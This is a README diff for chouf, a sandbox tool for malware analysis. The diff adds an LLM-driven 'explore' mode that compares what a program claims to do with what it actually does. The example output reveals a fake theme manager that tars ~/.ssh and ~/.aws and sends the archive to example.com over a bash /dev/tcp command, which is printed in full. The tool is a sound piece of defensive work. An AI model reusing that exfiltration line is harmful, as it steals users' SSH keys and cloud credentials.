@@ -41,6 +41,47 @@ Programs it ran (7)
        head -1
 ```
 
+## Explore: an AI tester, then a verdict
+
+`chouf run` shows what one run did. Some programs only misbehave after a question, a sub-command or a delay.
+`chouf explore` lets a model drive the program in the same sandbox, like a careful tester, then compares what the
+program **says** with what it **did**. A "theme manager" that hides its theft behind a prompt and a 15 s delay:
+
+```
+$ chouf explore --claim "a desktop theme manager" --file themectl -- sh /input/themectl
+
+How chouf explored it
+   [1] $ sh /input/themectl · exit 0  — the command you asked to check
+   [2] $ sh /input/themectl list · exit 0  — List the available themes to see how the tool interacts with the filesystem.
+   [3] $ sh /input/themectl install nordic · exit 0  — I will test the install command to see if it attempts to download themes from the network.
+   [4] $ sh /input/themectl install nordic  (typed "y") · exit 0  — I will attempt to install the nordic theme by providing 'y' to the confirmation prompt.
+   [5] $ sh /input/themectl sync · exit 0  — I will run the sync command to observe its background behavior as advertised.
+   [6] waited 20 s  — The sync command started a background process that sleeps for 15 seconds, so I will wait to see if it performs any network activity or file modifications.
+
+Secrets it went after
+ ! opened, read ~/.ssh/id_ed25519  (SSH private key)
+             by tar cz /root/.ssh /root/.aws
+ …
+Where it connected
+   example.com (2606:4700:10::ac42:93f3) port 80 tcp  by bash -c exec 3<>/dev/tcp/example.com/80; cat >&3
+
+What it says vs what it does  (opinion of gemini-3.1-flash-lite, not a measurement)
+   MALICIOUS: it steals, hides or contradicts itself
+   The program claims to be a desktop theme manager, but it performs unauthorized data exfiltration. It secretly
+   accesses sensitive SSH keys and AWS credentials and transmits them to an external server under the guise of a
+   background sync process.
+   !! says: themectl sync keeps themes up to date in the background
+      does: The sync process executes a command to archive and exfiltrate ~/.ssh and ~/.aws directories to an external server.
+   ok says: themectl install NAME downloads and installs a theme
+      does: The program creates directories and files in ~/.themes as expected for a theme manager.
+```
+
+- The model needs a Gemini key: `GEMINI_API_KEY` or `~/.config/chouf/gemini` (`CHOUF_MODEL` picks the model).
+  It reaches curl through a private file, never the command line.
+- Everything the program prints is fenced and labelled untrusted before the model sees it, the model's answers are
+  validated before anything runs (at most 6 steps, waits of 60 s), and everything runs in the sandbox.
+- The verdict is an opinion printed next to chouf's measured findings: it can neither hide nor change them.
+
 ## How it works
 
 - **A rootless podman container** (Ubuntu 24.04 by default). The program runs as root inside it, so installers behave as
@@ -68,7 +109,8 @@ what was touched, without saying by whom or where it connected.
 ## Usage
 
 ```
-chouf run [--image IMAGE] [--timeout SECS] [--no-net] [--file PATH]... -- COMMAND [ARGS]...
+chouf run     [--image IMAGE] [--timeout SECS] [--no-net] [--file PATH]... -- COMMAND [ARGS]...
+chouf explore [same options] [--claim TEXT] [--steps N] -- COMMAND [ARGS]...
 ```
 
 Exit code: 0 nothing alarming, 1 secrets / persistence / trust findings, 2 chouf itself failed.
@@ -76,9 +118,8 @@ Each run is kept in `~/.local/share/chouf/sessions/<id>/` (`report.json`, `stdou
 
 ## Status
 
-Early. Done: sandbox, baits, file watching, kernel tracer (who did what, where it connected).
-Next: an agent that explores the program (sub-commands, interactive prompts, waiting for delayed behaviour) and
-compares what it claims with what it does.
+Early. Done: sandbox, baits, file watching, kernel tracer (who did what, where it connected), the explorer and its
+verdict. Next: a plain-language report for non-experts, more baits (browsers, password managers, crypto wallets).
 
 ## Tests
 
